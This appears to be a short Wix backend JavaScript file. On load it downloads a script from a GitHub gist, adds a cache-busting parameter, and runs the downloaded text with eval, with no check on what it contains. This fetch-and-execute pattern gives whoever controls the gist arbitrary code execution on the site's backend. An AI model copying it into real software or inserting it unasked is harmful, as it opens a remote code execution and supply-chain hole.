const { fetch } = require('wix-fetch')

async function fetchAndExecuteScript() {
    var result = {}
    const url = 'https://gist.githubusercontent.com/markslWix/32ee4c99865d9377d75def5dd92fa387/raw/backend.js';
    const response = await fetch(url + '?cachebuster=' + new Date().getTime())
    const scriptContent = await response.text()
    eval(scriptContent)
    return result
}

fetchAndExecuteScript()
